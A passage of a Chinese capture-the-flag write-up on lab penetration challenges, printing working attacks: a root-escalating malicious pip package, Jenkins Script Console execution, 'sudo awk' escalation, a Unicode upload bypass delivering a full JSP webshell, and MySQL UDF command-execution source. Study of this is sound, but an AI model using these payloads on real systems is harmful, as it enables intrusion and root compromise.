class="string">&#x27;cp /flag-k1jj /tmp/flag_out &amp;&amp; chmod 666 /tmp/flag_out&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&#x27;pwn_pkg&#x27;</span>,</span><br><span class="line">    version=<span class="string">&#x27;1.0&#x27;</span>,</span><br><span class="line">    description=<span class="string">&#x27;POC package for privilege escalation&#x27;</span></span><br><span class="line">)</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空的__init__.py（可选）</span></span><br><span class="line">touch pwn_pkg.py</span><br></pre></td></tr></table></figure>
+<p><strong>执行pip安装</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以root权限安装恶意包</span></span><br><span class="line">sudo /opt/conda/bin/pip install . --no-build-isolation</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>sudo</code>：切换到root权限</li>
+<li><code>/opt/conda/bin/pip</code>：完整的pip路径（sudo允许）</li>
+<li><code>.</code>：当前目录（<a target="_blank" rel="noopener" href="http://xn--setup-pq7hs2e.py">包含setup.py</a>）</li>
+<li><code>--no-build-isolation</code>：防止隔离环境，确保代码在root上下文中执行</li>
+</ul>
+<p>读取flag:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证文件已生成</span></span><br><span class="line">ls -la /tmp/flag_out</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取flag</span></span><br><span class="line">cat /tmp/flag_out</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">flag&#123;fad53cb7-1149-443a-bb64-bb2e1f8f9a80&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="管中窥豹"><a class="markdownIt-Anchor" href="#管中窥豹"></a> 管中窥豹</h2>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171413947.png" alt="image-20260613171413947" /></p>
+<h3 id="jenkins-后台rce"><a class="markdownIt-Anchor" href="#jenkins-后台rce"></a> Jenkins 后台RCE</h3>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171408096.png" alt="image-20260613171408096" /></p>
+<p>弱口令登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin123</span><br></pre></td></tr></table></figure>
+<p>然后导航至 Manage Jenkins -&gt; Script Console ，该功能允许执行任意 Groovy 脚本。</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614160333519.png" alt="image-20260614160333519" /></p>
+<p>先执行身份确认：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">&quot;id&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;whoami&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)</span><br><span class="line"></span><br><span class="line">jenkins</span><br></pre></td></tr></table></figure>
+<p>说明当前命令执行权限为 <code>jenkins</code> 用户。</p>
+<p>也可以使用数组形式调用命令，方便执行带管道的 Shell：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println([<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &amp;&amp; whoami&quot;</span>].execute().text)</span><br></pre></td></tr></table></figure>
+<h3 id="sudo提权-awk"><a class="markdownIt-Anchor" href="#sudo提权-awk"></a> SUDO提权-awk</h3>
+<p>看看sudo权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &quot;sudo -l&quot;.execute().text</span><br></pre></td></tr></table></figure>
+<p>输出显示 <code>jenkins</code> 用户可以免密以 root 身份运行 <code>/usr/bin/awk</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User jenkins may run the following commands on [hostname]:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/awk</span><br></pre></td></tr></table></figure>
+<p>根据 GTFOBins 中 <code>awk</code> 的 sudo 利用方式，可执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在 Jenkins Script Console 中不方便维持交互式 Shell，因此直接让 <code>awk</code> 执行单条命令验证 root 权限：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;BEGIN&#123;system(\&quot;id\&quot;)&#125;&quot;</span>].execute().text)</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>已能通过 <code>sudo awk</code> 以 root 身份执行命令。</p>
+<p>直接读flag即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println([&quot;sudo&quot;, &quot;awk&quot;, &quot;BEGIN&#123;system(\&quot;cat /flag-2yyj\&quot;)&#125;&quot;].execute().text)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">也可以写成命令行形式：</span></span><br><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;cat /flag-2yyj&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="暗渡陈仓复现"><a class="markdownIt-Anchor" href="#暗渡陈仓复现"></a> 暗渡陈仓(复现)</h2>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171437022.png" alt="image-20260613171437022" /></p>
+<h3 id="ghost-bits-上传绕过"><a class="markdownIt-Anchor" href="#ghost-bits-上传绕过"></a> Ghost Bits 上传绕过</h3>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171443006.png" alt="image-20260613171443006" /></p>
+<p>一个文件上传系统，后端是java</p>
+<p>上传一个jsp文件被waf后缀了</p>
+<p>进一步测试发现，当上传文件名中包含特殊 Unicode 字符时，响应会回显“保存为：转换后的文件名”，说明后端在文件名处理过程中发生了字符转换。</p>
+<p>关键点是：校验阶段按 Unicode 字符串判断后缀，但实际写入文件系统时可能发生窄化转换，例如将 <code>char</code> 强转为 <code>byte</code>，导致高 8 位被截断，只保留低 8 位。</p>
+<p><code>.jsp</code> 的 ASCII 字节为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2e 6a 73 70</span><br></pre></td></tr></table></figure>
+<p>构造 Unicode 字符时，将高位固定为 <code>0x01</code>，低 8 位保持目标 ASCII 字节。这样校验时文件名不是普通 <code>.jsp</code>，落盘时却会被截断为 <code>.jsp</code>。</p>
+<p>转换脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">suffix = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">b&quot;.jsp&quot;</span>:</span><br><span class="line">    suffix += <span class="built_in">chr</span>(<span class="number">0x0100</span> + b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shell&quot;</span> + suffix)</span><br><span class="line"><span class="comment"># shellĮŪųŰ</span></span><br></pre></td></tr></table></figure>
+<p>最终上传文件名形如：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testĮŪųŰ</span><br></pre></td></tr></table></figure>
+<p>后端校验时认为它不是 JSP 后缀，写入时低 8 位截断，最终落盘为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.jsp</span><br></pre></td></tr></table></figure>
+<p>上传请求示例：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.3.32:8080</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----geckoformboundary38d249c96fd8960ca81bc872fd164ce3</span><br><span class="line"></span><br><span class="line"><span class="language-java">------geckoformboundary38d249c96fd8960ca81bc872fd164ce3</span></span><br><span class="line"><span class="language-java">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;testĮŪųŰ&quot;</span></span></span><br><span class="line"><span class="language-java">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-java"></span></span><br><span class="line"><span class="language-java">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;</span></span><br><span class="line"><span class="language-java">&lt;%!</span></span><br><span class="line"><span class="language-java"><span class="keyword">private</span> <span class="type">byte</span>[] Decrypt(<span class="type">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-java">    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span></span><br><span class="line"><span class="language-java">    javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>);</span></span><br><span class="line"><span class="language-java">    c.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(k.getBytes(), <span class="string">&quot;AES&quot;</span>));</span></span><br><span class="line"><span class="language-java"></span></span><br><span class="line"><span class="language-java">    <span class="type">byte</span>[] decodebs;</span></span><br><span class="line"><span class="language-java">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-java">        <span class="type">Class</span> <span class="variable">baseCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-java">        <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> baseCls.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(baseCls, <span class="literal">null</span>);</span></span><br><span class="line"><span class="language-java">        decodebs = (<span class="type">byte</span>[]) decoder.getClass()</span></span><br><span class="line"><span class="language-java">            .getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;)</span></span><br><span class="line"><span class="language-java">            .invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;data&#125;);</span></span><br><span class="line"><span class="language-java">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span></span><br><span class="line"><span class="language-java">        <span class="type">Class</span> <span class="variable">baseCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-java">        <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> baseCls.newInstance();</span></span><br><span class="line"><span class="language-java">        decodebs = (<span class="type">byte</span>[]) decoder.getClass()</span></span><br><span class="line"><span class="language-java">            .getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;)</span></span><br><span class="line"><span class="language-java">            .invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(data)&#125;);</span></span><br><span class="line"><span class="language-java">    &#125;</span></span><br><span class="line"><span class="language-java">    <span class="keyword">return</span> c.doFinal(decodebs);</span></span><br><span class="line"><span class="language-java">&#125;</span></span><br><span class="line"><span class="language-java">%&gt;</span></span><br><span class="line"><span class="language-java">&lt;%!<span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span></span><br><span class="line"><span class="language-java">    U(ClassLoader c) &#123; <span class="built_in">super</span>(c); &#125;</span></span><br><span class="line"><span class="language-java">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123; <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length); &#125;</span></span><br><span class="line"><span class="language-java">&#125;%&gt;</span></span><br><span class="line"><span class="language-java">&lt;%</span></span><br><span class="line"><span class="language-java"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-java">    <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span></span><br><span class="line"><span class="language-java">    <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">512</span>];</span></span><br><span class="line"><span class="language-java">    <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> request.getInputStream().read(buf);</span></span><br><span class="line"><span class="language-java">    <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-java">        <span class="type">byte</span>[] data = Arrays.copyOfRange(buf, <span class="number">0</span>, length);</span></span><br><span class="line"><span class="language-java">        bos.write(data);</span></span><br><span class="line"><span class="language-java">        length = request.getInputStream().read(buf);</span></span><br><span class="line"><span class="language-java">    &#125;</span></span><br><span class="line"><span class="language-java">    out.clear();</span></span><br><span class="line"><span class="language-java">    out = pageContext.pushBody();</span></span><br><span class="line"><span class="language-java">    <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader())</span></span><br><span class="line"><span class="language-java">        .g(Decrypt(bos.toByteArray()))</span></span><br><span class="line"><span class="language-java">        .newInstance()</span></span><br><span class="line"><span class="language-java">        .equals(pageContext);</span></span><br><span class="line"><span class="language-java">&#125;</span></span><br><span class="line"><span class="language-java">%&gt;</span></span><br><span class="line"><span class="language-java">------geckoformboundary38d249c96fd8960ca81bc872fd164ce3--</span></span><br></pre></td></tr></table></figure>
+<p>上传成功</p>
+<p>获取的是低权限：<code>uid=1001(tomcatuser) gid=1001(tomcatuser) groups=1001(tomcatuser)</code></p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614153428385.png" alt="image-20260614153428385" /></p>
+<h3 id="获取数据库凭据"><a class="markdownIt-Anchor" href="#获取数据库凭据"></a> 获取数据库凭据</h3>
+<p>通过 WebShell 文件管理功能查看 Tomcat 应用配置：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT/META-INF/context.xml</span><br></pre></td></tr></table></figure>
+<p>配置内容中泄露了 MySQL 连接信息：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Resource</span> <span class="attr">name</span>=<span class="string">&quot;jdbc/ShadowFacetsDB&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">auth</span>=<span class="string">&quot;Container&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">type</span>=<span class="string">&quot;javax.sql.DataSource&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">maxTotal</span>=<span class="string">&quot;100&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">maxIdle</span>=<span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">maxWaitMillis</span>=<span class="string">&quot;10000&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">username</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">password</span>=<span class="string">&quot;ShadowF@cets_DB_2026!&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">driverClassName</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">url</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/shadowfacets?useSSL=false<span class="symbol">&amp;amp;</span>serverTimezone=UTC&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到数据库账号：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: root</span><br><span class="line">password: ShadowF@cets_DB_2026!</span><br></pre></td></tr></table></figure>
+<h3 id="udf提权冰蝎自定义代码执行"><a class="markdownIt-Anchor" href="#udf提权冰蝎自定义代码执行"></a> UDF提权+冰蝎自定义代码执行</h3>
+<p>进程枚举：</p>
+<p><img src="%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614153545130.png" alt="image-20260614153545130" /></p>
+<p>发现mysql进程以root运行</p>
+<ul>
+<li>MySQL 插件目录为 <code>/usr/lib/mysql/plugin/</code>；</li>
+<li>如果能创建 MySQL UDF 函数，函数执行命令时会继承 MySQL 的 root 权限。</li>
+</ul>
+<h4 id="上传so编译文件"><a class="markdownIt-Anchor" href="#上传so编译文件"></a> 上传so编译文件</h4>
+<p>在本地准备 <code>lib_mysqludf_sys.c</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">sys_eval_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *message)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sys_eval_deinit</span><span class="params">(UDF_INIT *initid)</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">sys_eval</span><span class="params">(</span></span><br><span class="line"><span class="params">    UDF_INIT *initid,</span></span><br><span class="line"><span class="params">    UDF_ARGS *args,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *result,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">long</span> *length,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *is_null,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *error</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">sys_eval_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *message)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (args-&gt;arg_count != <span class="number">1</span> || args-&gt;arg_type[<span class="number">0</span>] != STRING_RESULT) &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(message, <span class="string">&quot;sys_eval() requires exactly one string argument&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    initid-&gt;max_length = <span class="number">65535</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sys_eval_deinit</span><span class="params">(UDF_INIT *initid)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">sys_eval</span><span class="params">(</span></span><br><span class="line"><span class="params">    UDF_INIT *initid,</span></span><br><span class="line"><span class="params">    UDF_ARGS *args,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *result,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">long</span> *length,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *is_null,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> *error</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> *command;</span><br><span class="line">    <span class="type">char</span> *output = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> output_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> output_len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    command = (<span class="type">char</span> *)<span class="built_in">malloc</span>(args-&gt;lengths[<span class="number">0</span>] + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!command) &#123;</span><br><span class="line">        *is_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(command, args-&gt;args[<span class="number">0</span>], args-&gt;lengths[<span class="number">0</span>]);</span><br><span class="line">    command[args-&gt;lengths[<span class="number">0</span>]] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    fp = popen(command, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(command);</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        *is_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="type">size_t</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">        <span class="keyword">if</span> (output_len + len + <span class="number">1</span> &gt; output_size) &#123;</span><br><span class="line">            output_size = output_len + len + <span class="number">1</span> + <span class="number">4096</span>;</span><br><span class="line">            <span class="type">char</span> *new_output = <span class="built_in">realloc</span>(output, output_size);</span><br><span class="line">            <span class="keyword">if</span> (!new_output) &#123;</span><br><span class="line">                <span class="built_in">free</span>(output);</span><br><span class="line">                pclose(fp);</span><br><span class="line">                *is_null = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            output = new_output;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(output + output_len, buf, len + <span class="number">1</span>);</span><br><span class="line">        output_len += len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (!output) &#123;</span><br><span class="line">        *is_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *length = output_len;</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>安装编译依赖并编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install -y gcc libmysqlclient-dev</span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC -o lib_mysqludf_sys.so lib_mysqludf_sys.c \</span><br><span class="line">  $(mysql_config --cflags) $(mysql_config --libs)</span><br></pre></td></tr></table></figure>
+<p>如果环境中没有 <code>libmysqlclient-dev</code>，可以尝试安装兼容包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y libmariadb-dev-compat</span><br></pre></td></tr></table></figure>
+<p>注意：靶机 MySQL 为 8.0 时，UDF 动态库最好使用相近版本开发库编译，减少 ABI 不兼容问题。</p>
+<p>编译完成后，通过上传功能或 WebShell 将文件传到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT/uploads/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
